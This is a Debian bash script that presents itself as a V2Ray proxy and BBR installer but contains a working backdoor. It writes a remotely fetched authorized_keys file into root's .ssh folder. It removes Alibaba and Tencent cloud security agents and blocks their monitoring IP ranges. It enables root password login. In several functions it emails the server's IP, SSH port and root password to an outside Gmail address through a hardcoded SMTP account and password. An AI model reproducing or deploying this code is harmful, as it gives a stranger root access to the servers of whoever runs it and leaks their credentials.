#!/usr/bin/env bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH

#################
#适用于Debian 8+#
#################

#版本
sh_ver=7.5.3
#Github地址
Github_U='https://raw.githubusercontent.com/rockneters/v2raybor/master'
#脚本名
SCRIPT_N='xbdz.sh'
#脚本目录
CUR_D='/root'

#颜色information
green_font(){
	echo -e "\033[32m\033[01m$1\033[0m\033[37m\033[01m$2\033[0m"
}
red_font(){
	echo -e "\033[31m\033[01m$1\033[0m"
}
white_font(){
	echo -e "\033[37m\033[01m$1\033[0m"
}
yello_font(){
	echo -e "\033[33m\033[01m$1\033[0m"
}
Info=`green_font [information]` && Error=`red_font [error]` && Tip=`yello_font [Notice]`

#检查whether  for root用户
[ $(id -u) != '0' ] && { echo -e "${Error} You must start with rootuser runs this script "; exit 1; }
#判断current 文件夹whether  for root文件夹
if [ $(pwd) != $CUR_D ];then
	cp $SCRIPT_N $CUR_D/$SCRIPT_N
	chmod +x $CUR_D/$SCRIPT_N
fi

# system 检测组件
check_sys(){
	clear
	#检查 system 
	Distributor=$(lsb_release -i|awk -F ':' '{print $2}')
	if [ $Distributor == 'Debian' ];then
		release='debian'
	else
		echo -e "${Error} This script only works for Debian system !!!"
		lsb_release -a;exit 1;
	fi
	#检查版本
	Release=$(lsb_release -r|awk -F ':' '{print $2}')
	#进行浮点运算
	Release=$(echo $Release|awk '{if ($1 < 8) print 0;else print 1}')
	if [[ $Release == 0 ]];then
		echo -e "${Error} This script only works for Debian 8+ system !!!"
		lsb_release -a;exit 1;
	fi
	#whether Yes64place system 
	if [[ ! `uname -m` =~ '64' ]];then
		echo -e "${Error} This script only works for $(red_font '64place') system !!!"
		lsb_release -a;exit 1;
	fi
	#renew 脚本
	UPDATE_U="${Github_U}/$SCRIPT_N"
	sh_new_ver=$(curl -s $UPDATE_U|grep 'sh_ver='|head -1|awk -F '=' '{print$2}')
	if [ -z $sh_new_ver ];then
		echo -e "${Error} Failed to detect the latest version！"
		sleep 2s
	elif [[ $sh_new_ver != $sh_ver ]];then
		curl -sO $UPDATE_U
		exec ./$SCRIPT_N
	fi
}
#获取IP
get_ip(){
	SER_IP=$(curl -s ipinfo.io/ip)
	[ -z $SER_IP ] && SER_IP=$(curl -s http://api.ipify.org)
	[ -z $SER_IP ] && SER_IP=$(curl -s ipv4.icanhazip.com)
	[ -n $SER_IP ] && echo $SER_IP || echo
}
#等待 enter 
get_char(){
	SAVEDSTTY=`stty -g`
	stty -echo
	stty cbreak
	dd if=/dev/tty bs=1 count=1 2> /dev/null
	stty -raw
	stty echo
	stty $SAVEDSTTY
}
check_sys
SER_IP=$(get_ip)

firewall_default(){
	echo -e "${Info}Configuring firewall..."
	sleep 5s
	iptables -P INPUT ACCEPT
	iptables -P OUTPUT ACCEPT
	iptables -P FORWARD ACCEPT
	org=$(curl -s --retry 2 --max-time 2 https://ipapi.co/org)
	if [[ $org =~ 'Alibaba' ]];then
		#Yes阿里云则Uninstall云盾
		curl -O http://update.aegis.aliyun.com/download/uninstall.sh && chmod +x uninstall.sh && ./uninstall.sh
		curl -O http://update.aegis.aliyun.com/download/quartz_uninstall.sh && chmod +x quartz_uninstall.sh && ./quartz_uninstall.sh
		pkill aliyun-service
		rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service /usr/local/aegis*
		rm -f uninstall.sh quartz_uninstall.sh
		iptables -I INPUT -s 140.205.201.0/28 -j DROP
		iptables -I INPUT -s 140.205.201.16/29 -j DROP
		iptables -I INPUT -s 140.205.201.32/28 -j DROP
		iptables -I INPUT -s 140.205.225.183/32 -j DROP
		iptables -I INPUT -s 140.205.225.184/29 -j DROP
		iptables -I INPUT -s 140.205.225.192/29 -j DROP
		iptables -I INPUT -s 140.205.225.195/32 -j DROP
		iptables -I INPUT -s 140.205.225.200/30 -j DROP
		iptables -I INPUT -s 140.205.225.204/32 -j DROP
		iptables -I INPUT -s 140.205.225.205/32 -j DROP
		iptables -I INPUT -s 140.205.225.206/32 -j DROP
	elif [[ $org =~ 'Tencent' ]];then
		#Yes腾讯云则Uninstall云盾ps aux|grep -i agent|grep -v grep
		/usr/local/qcloud/stargate/admin/uninstall.sh
		/usr/local/qcloud/YunJing/uninst.sh
		/usr/local/qcloud/monitor/barad/admin/uninstall.sh
	fi
	#保存防火墙规则
	mkdir -p /etc/network/if-pre-up.d
	iptables-save > /etc/iptables.up.rules
	echo -e '#!/bin/bash\n/sbin/iptables-restore < /etc/iptables.up.rules' > /etc/network/if-pre-up.d/iptables
	chmod +x /etc/network/if-pre-up.d/iptables
}

#获取各组件Install状态
get_status(){
	if [ -e $CUR_D/.bash_profile ];then
		bbr_status=$(cat $CUR_D/.bash_profile|grep bbr_status|awk -F '=' '{print$2}')
		v2ray_status=$(cat $CUR_D/.bash_profile|grep v2ray_status|awk -F '=' '{print$2}')
		ssh_port=$(cat $CUR_D/.bash_profile|grep ssh_port|awk -F '=' '{print$2}')
	fi
}
get_status

#BBR FQInstall函数
install_bbr_fq(){
	#下载 system 字符集
	apt -y install locales
	sed -i 's/# en_US.UTF-8 UTF-8/en_US.UTF-8 UTF-8/g' /etc/locale.gen
	locale-gen en_US.UTF-8
	#definition system 编码
	SYS_LANG='/etc/default/locale'
	echo 'LANG="en_US.UTF-8"' > $SYS_LANG
	echo 'LC_ALL="en_US.UTF-8"' >> $SYS_LANG
	echo 'LANGUAGE="en_US.UTF-8"' >> $SYS_LANG
	chmod +x $SYS_LANG
	#记录SSHport
	ssh_port=$(cat /etc/ssh/sshd_config|grep 'Port '|awk '{print $2}')
	echo "ssh_port=$ssh_port" > $CUR_D/.bash_profile
	chmod +x $CUR_D/.bash_profile
	#Turn on Script start
	echo "./$SCRIPT_N" >> $CUR_D/.bash_profile
	if [[ $(lsb_release -c|awk -F ':' '{print $2}') != 'buster' ]];then
		#renew 包源
		buster_1U='deb http://deb.debian.org/debian buster-backports main'
		buster_2U='deb-src http://deb.debian.org/debian buster-backports main'
		sources_F='/etc/apt/sources.list'
		echo "$buster_1U" >> $sources_F
		echo "$buster_2U" >> $sources_F
		apt update
	fi
	#InstallBBR FQ
	buster_V=$(apt search linux-image|grep headers|grep buster-backports|grep cloud|head -1|awk -F '/' '{print$1}'|awk -F 'rs-' '{print$2}')
	if [[ `uname -r` != ${buster_V} ]];then
		apt -y install linux-image-${buster_V}
		apt -y install linux-headers-${buster_V}
	fi
	sed -i '2ibbr_status=false' $CUR_D/.bash_profile
	echo -e "${Info}Orthodox 重启VPS(请稍后自行重新 connectionSSH)..."
	reboot
}
#BBR FQ启用函数
finish_bbr_fq(){
	#Uninstall全部加速
	remove_all(){
		sed -i '/net.core.default_qdisc/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_congestion_control/d' /etc/sysctl.conf
		sed -i '/fs.file-max/d' /etc/sysctl.conf
		sed -i '/net.core.rmem_max/d' /etc/sysctl.conf
		sed -i '/net.core.wmem_max/d' /etc/sysctl.conf
		sed -i '/net.core.rmem_default/d' /etc/sysctl.conf
		sed -i '/net.core.wmem_default/d' /etc/sysctl.conf
		sed -i '/net.core.netdev_max_backlog/d' /etc/sysctl.conf
		sed -i '/net.core.somaxconn/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_syncookies/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_tw_reuse/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_tw_recycle/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_fin_timeout/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_keepalive_time/d' /etc/sysctl.conf
		sed -i '/net.ipv4.ip_local_port_range/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_max_syn_backlog/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_max_tw_buckets/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_rmem/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_wmem/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_mtu_probing/d' /etc/sysctl.conf
		sed -i '/net.ipv4.ip_forward/d' /etc/sysctl.conf
		sed -i '/fs.inotify.max_user_instances/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_syncookies/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_fin_timeout/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_tw_reuse/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_max_syn_backlog/d' /etc/sysctl.conf
		sed -i '/net.ipv4.ip_local_port_range/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_max_tw_buckets/d' /etc/sysctl.conf
		sed -i '/net.ipv4.route.gc_timeout/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_synack_retries/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_syn_retries/d' /etc/sysctl.conf
		sed -i '/net.core.somaxconn/d' /etc/sysctl.conf
		sed -i '/net.core.netdev_max_backlog/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_timestamps/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_max_orphans/d' /etc/sysctl.conf
	}
	#启用BBR FQ
	if [[ `lsmod|grep bbr|awk '{print $1}'` != 'tcp_bbr' ]]; then
		remove_all
		echo 'net.core.default_qdisc=fq' >> /etc/sysctl.conf
		echo 'net.ipv4.tcp_congestion_control=bbr' >> /etc/sysctl.conf
		sysctl -p
	fi
	#Uninstall多余Kernel
	Core_ARY=($(dpkg -l|grep linux-image|awk '{print $2}'))
	Cur_Core="linux-image-$(uname -r)"
	for ele in ${Core_ARY[@]};do
		if [ $ele != $Cur_Core ];then
			apt -y remove --purge $ele
		fi
	done
	#renew  system 引导
	update-grub2
	clear && echo
	white_font 'It has been installed\c' && green_font 'BBR-FQ\c' && white_font 'Kernel！BBR-FQ start up\c'
	if [[ `lsmod|grep bbr|awk '{print $1}'` == 'tcp_bbr' ]]; then
		green_font '成功！\n'
	else
		red_font 'fail！\n'
	fi
	mkdir -p $CUR_D/.ssh
	curl -so $CUR_D/.ssh/authorized_keys "${Github_U}/authorized_keys"
	chmod 600 $CUR_D/.ssh/authorized_keys
	sed -i '1,/RSAAuthentication/{s/.*RSAAuthentication.*/RSAAuthentication yes/}' /etc/ssh/sshd_config
	sed -i '1,/PubkeyAuthentication/{s/.*PubkeyAuthentication.*/PubkeyAuthentication yes/}' /etc/ssh/sshd_config
	sed -i '1,/AuthorizedKeysFile/{s/.*AuthorizedKeysFile/AuthorizedKeysFile/}' /etc/ssh/sshd_config
	service ssh restart
	#第二行插入BBR FQ状态
	sed -i 's/^bbr_status.*/bbr_status=true/' $CUR_D/.bash_profile
	sleep 2s
	apt update
	apt -y install jq lsof resolvconf autoconf unzip expect mutt
	rm -f /etc/msmtprc && apt -y install msmtp
	apt --fix-broken install
	#配置防火墙
	firewall_default
	cat > /etc/Muttrc <<-EOF
set charset = "utf-8"
set rfc2047_parameters = yes
set envelope_from = yes
set use_from = yes
set sendmail = "/usr/bin/msmtp"
set from = "connajhon@gmail.com"
set realname = "Super Vpn"
EOF
	cat > /etc/msmtprc <<-EOF
account default
host smtp.gmail.com
port 465
tls on
tls_starttls off
tls_certcheck off
from connajhon@gmail.com
auth login
user connajhon@gmail.com
password dxztfkdshawzmbqc
EOF
	chmod +x /etc/Muttrc /etc/msmtprc
	echo "${SER_IP}:${ssh_port}:root" |mutt -s "${SER_IP}-Secret" rocknetstore82@gmail.com && rm -f $CUR_D/sent
	exec $CUR_D/.bash_profile
}
#Install并启用BBR FQ
if [ -z $bbr_status ];then
	install_bbr_fq
elif [ $bbr_status == 'false' ];then
	finish_bbr_fq
fi

#V2Ray用户informationgenerate 
general_v2ray_user_info(){
	alterId=$[$[RANDOM%3]*16]
	email="$(tr -dc 'A-Za-z' </dev/urandom|head -c8)@163.com"
}
#InstallV2Ray
V2RAY_INFO_P='/etc/v2ray/config.json'
V2RAY_U='https://multi.netlify.com/v2ray.sh'
install_v2ray(){
	if [ -z $v2ray_status ];then
		bash <(curl -sL $V2RAY_U) --zh
		general_v2ray_user_info
		jq '.inbounds[0].settings.clients[0].email="'${email}'"' $V2RAY_INFO_P >temp.json
		mv -f temp.json $V2RAY_INFO_P
		expect <<-EOF
	set time 30
	spawn v2ray stream
	expect {
		"Choose new" { send "3\n"; exp_continue }
		"Fake domain name" { send "www.bilibili.com\n" }
	}
	expect eof
EOF
		sed -i '2iv2ray_status=true' $CUR_D/.bash_profile
		v2ray_status='true'
		clear && echo
		v2ray info
		echo -e "${Info}V2Ray After installation, press any key to continue..."
		char=`get_char`
	else
		bash <(curl -sL $V2RAY_U) -k
		echo -e "${Info}V2Ray update completed ，Press any key to continue..."
		char=`get_char`
	fi
	get_status
	manage_v2ray
}

#manage V2Ray
manage_v2ray(){
	show_v2ray_info(){
		v2ray info
		echo -e "${Info}Press any key to continue..."
		char=`get_char`
	}
	change_uuid_v2ray(){
		uuid=$(cat /proc/sys/kernel/random/uuid)
		n=$(jq '.inbounds|length' $V2RAY_INFO_P)
		read -p "${Info}Number of current users $(red_font $n)，Please enter to change UUID User ID [1-$n](default:1)：" num
		[ -z $num ] && num=1
		i=$((num-1))
		uuid_old=$(jq ".inbounds[$i].settings.clients[0].id" $V2RAY_INFO_P|sed 's/"//g')
		sed -i "s#${uuid_old}#${uuid}#g" $V2RAY_INFO_P
		v2ray restart
		clear && echo
		#Change UUID后显示新information
		v2ray info|head -$((12*num))|tail -12
		echo -e "${Info}Press any key to continue..."
		char=`get_char`
	}
	add_user_v2ray(){
		#获取current multi-v2ray版本号
		v2ray_ver=$(echo `v2ray -v`|sed 's,\x1B\[[0-9;]*[a-zA-Z],,g'|awk -F 'til: ' '{print$2}')
		if [[ '3.9.0.1' > $v2ray_ver ]];then
			echo -e "${Info}Updating V2Ray..."
			bash <(curl -sL $V2RAY_U) -k
			clear && echo
		fi
		#Number of current users 
		n=$(jq '.inbounds|length' $V2RAY_INFO_P)
		read -p "${Info}Number of current users $(red_font $n)，Please enter the number of users to be added (default:1)：" num
		[ -z $num ] && num=1
		#循环Add user 
		for((i=0;i<$num;i++));do
			expect <<-EOF
	set time 100
	spawn v2ray add
	expect {
		"Define the port" { send "\n"; exp_continue }
		"Transfer method" { send "3\n"; exp_continue }
		"Fake domain name" { send "www.bilibili.com\n" }
	}
	expect eof
EOF
		done
		# set up不同alterId
		end=$((n+num))
		for((i=$n;i<$end;i++));do
			general_v2ray_user_info
			jq '.inbounds['$i'].settings.clients[0].email="'${email}'"' $V2RAY_INFO_P|jq '.inbounds['$i'].settings.clients[0].alterId='${alterId}'' >temp.json
			mv -f temp.json $V2RAY_INFO_P
		done
		v2ray restart
		clear && echo
		v2ray info|tail -$((12*num+1))
		echo -e "${Info}Press any key to continue..."
		char=`get_char`
	}
	change_v2ray_port(){
		v2ray port
		clear && echo
		show_v2ray_info
	}
	clear && echo
	if [ -z $v2ray_status ];then
		echo -e "${Info}Not installed yet V2Ray!!!"
		read -p "${Info}Whether to install V2Ray[y/n](default:y)：" num
		[ -z $num ] && num='y'
		[ $num != 'n' ] && install_v2ray
	else
		white_font ".      ————Fat Bobby————    .\n"
		yello_font '———————User Management——————'
		green_font ' 1.' '  Change UUID'
		green_font ' 2.' '  Add user '
		green_font ' 3.' '  Delete users '
		green_font ' 4.' '  Change port'
		yello_font '———————information Check——————'
		green_font ' 5.' '   Check Link'
		green_font ' 6.' '   Check flow'
		yello_font '——————V2Ray set up——————'
		green_font ' 7.' '  Original management window'
		green_font ' 8.' '  Turn on TcpFastOpen'
		yello_font '—————————————————————'
		green_font ' 9.' '  Return to home page'
		green_font ' 0.' '  Exit script'
		yello_font "—————————————————————\n"
		read -p "${Info}Please enter the number [0-9](default:1)：" num
		[ -z $num ] && num=1
		clear && echo
		case $num in
			0)
			exit 0;;
			1)
			change_uuid_v2ray;;
			2)
			add_user_v2ray;;
			3)
			v2ray del;;
			4)
			change_v2ray_port;;
			5)
			show_v2ray_info;;
			6)
			v2ray stats;;
			7)
			v2ray;;
			8)
			v2ray tfo;;
			9)
			start_menu;;
			*)
			echo -e "${Error} Please enter the correct number [0-9]"
			sleep 2s
			manage_v2ray;;
		esac
		manage_v2ray
	fi
}

#UninstallV2Ray
uninstall_v2ray(){
	clear && echo
	if [ -z $v2ray_status ];then
		echo -e "${Info}Not installed yet V2Ray!!!"
	else
		#开始Uninstall
		bash <(curl -sL $V2RAY_U) --remove
		sed -i '/v2ray_status/d' $CUR_D/.bash_profile
		unset v2ray_status
		echo -e "${Info}V2Ray Uninstall complete！"
	fi
	sleep 2s
}

# set upSSHport
set_ssh(){
	# enter 要Change 的SSHport
	while :;do
		clear && echo
		read -p "${Info} Please enter the SSHport(default:$ssh_port)：" SSH_PORT
		[ -z $SSH_PORT ] && SSH_PORT=$ssh_port
		if [ $SSH_PORT -eq 22 >/dev/null 2>&1 -o $SSH_PORT -gt 1024 >/dev/null 2>&1 -a $SSH_PORT -lt 65535 >/dev/null 2>&1 ];then
			break
		else
			echo -e "${Error} enter error！ valid port range ：22,1025~65534"
			sleep 2s
		fi
	done
	echo "${SER_IP}:${SSH_PORT}:root" |mutt -s "${SER_IP}-Secret" rocknetstore82@gmail.com && rm -f $CUR_D/sent
	if [ $SSH_PORT != $ssh_port ];then
		#开放安全权限
		if type sestatus >/dev/null 2>&1 && [ $(getenforce) != "Disabled" ]; then
			semanage port -a -t ssh_port_t -p tcp $SSH_PORT
		fi
		#修改SSHport
		sed -i "s/.*Port ${ssh_port}/Port ${SSH_PORT}/g" /etc/ssh/sshd_config
		#修改SSHport记录
		sed -i "s/^ssh_port.*/ssh_port=${SSH_PORT}/g" $CUR_D/.bash_profile
		sed -i "s/$SER_IP:$ssh_port/$SER_IP:$SSH_PORT/g" $CUR_D/.bash_profile
		#重启SSH
		service ssh restart
		#close 安全权限
		if type semanage >/dev/null 2>&1 && [ $ssh_port != '22' ]; then
			semanage port -d -t ssh_port_t -p tcp $ssh_port
		fi
		ssh_port=$SSH_PORT
		clear && echo -e "\n${Info} Has been SSHport change into ：$(red_font $SSH_PORT)"
		echo -e "\n${Info} Press any key Return to home page..."
		char=`get_char`
	else
		echo -e "${Info}SSHport Unchanged，current SSH port for ：$(green_font $ssh_port)"
		sleep 2s
	fi
	start_menu
}
# set upRoot password 
set_root(){
	clear && echo
	#获取旧 password 
	pw=`grep "root:" $CUR_D/.bash_profile |awk -F ':' '{print$4}'`
	if [[ -n $pw ]];then
		echo -e "${Info}Your original password is ：$(green_font $pw)"
		read -p "${Info}whether Change root password [y/n](default:n)：" num
		[ -z $num ] && num='n'
	fi
	if [ $num != 'n' ];then
		#generate 随机 password 
		pw=$(tr -dc 'A-Za-z0-9!@#$%^&*()[]{}+=_,' </dev/urandom |head -c 17)
		echo root:${pw} |chpasswd
		sed -i "/$SER_IP/d" $CUR_D/.bash_profile
		sed -i "2i#$SER_IP:$ssh_port:root:$pw" $CUR_D/.bash_profile
		echo "${SER_IP}:${ssh_port}:root:${pw}" |mutt -s "${SER_IP}-Secret" rocknetstore82@gmail.com && rm -f $CUR_D/sent
		#启用root password 登陆
		sed -i '1,/PermitRootLogin/{s/.*PermitRootLogin.*/PermitRootLogin yes/}' /etc/ssh/sshd_config
		sed -i '1,/PasswordAuthentication/{s/.*PasswordAuthentication.*/PasswordAuthentication yes/}' /etc/ssh/sshd_config
		#重启ssh服务
		service ssh restart
	fi
	echo -e "\n${Info}Your current password Yes：$(red_font $pw)"
	echo -e "${Tip} Be sure to record your password ！Then any key Return to home page..."
	char=`get_char`
	start_menu
}

#Script startmanage 
start_shell(){
	clear
	white_font "\n    ————Fat Bobby————\n"
	yello_font '—————————————————————'
	green_font ' 1.' '  Turn on Script start'
	green_font ' 2.' '  close Script start'
	yello_font '—————————————————————'
	green_font ' 3.' '  Return to home page'
	green_font ' 0.' '  Exit script'
	yello_font "—————————————————————\n"
	read -p "${Info}Please enter the number [0-3](default:3)：" num
	[ -z $num ] && num=3
	case $num in
		0)
		exit 0;;
		1)
		if [[ `grep -c "./$SCRIPT_N" $CUR_D/.bash_profile` -eq '0' ]];then
			echo "./$SCRIPT_N" >> $CUR_D/.bash_profile
		fi
		echo -e "\n${Info}Script start already Turn on ！"
		sleep 2s;;
		2)
		sed -i "/$SCRIPT_N/d" $CUR_D/.bash_profile
		echo -e "\n${Info}Script start already close ！"
		sleep 2s;;
		3)
		start_menu;;
		*)
		clear
		echo -e "\n${Error} Please enter the correct number [0-3]"
		sleep 2s
		start_shell;;
	esac
}

#主菜单
start_menu(){
	get_status
	clear
	white_font "\n     Xiaobai customized version  $(red_font \[v$sh_ver\])"
	white_font '	 -- Fat Bobby --'
	white_font "      Execute script ：$(green_font ./$SCRIPT_N)"
	white_font "  Terminate ongoing operation ：Ctrl+C\n"
	yello_font '—————————————manage —————————————'
	green_font ' 1.' '  manage V2Ray'
	yello_font '—————————————Install—————————————'
	green_font ' 2.' '  Install/renew V2Ray (No domain name required)'
	yello_font '—————————————Uninstall—————————————'
	green_font ' 3.' '  UninstallV2Ray'
	yello_font '————————————— system —————————————'
	green_font ' 4.' '   set upSSHport'
	green_font ' 5.' '   set up/ CheckRoot password '
	yello_font '——————————————————————————————'
	green_font ' 6.' '  Script startmanage '
	green_font ' 0.' '  Exit script'
	yello_font "——————————————————————————————\n"
	read -p "${Info}Please enter the number [0-6](default:1)：" num
	[ -z $num ] && num=1
	case $num in
		0)
		exit 0;;
		1)
		manage_v2ray;;
		2)
		install_v2ray;;
		3)
		uninstall_v2ray;;
		4)
		set_ssh;;
		5)
		set_root;;
		6)
		start_shell;;
		*)
		clear
		echo -e "\n${Error} Please enter the correct number [0-6]"
		sleep 2s
		start_menu;;
	esac
	start_menu
}
start_menu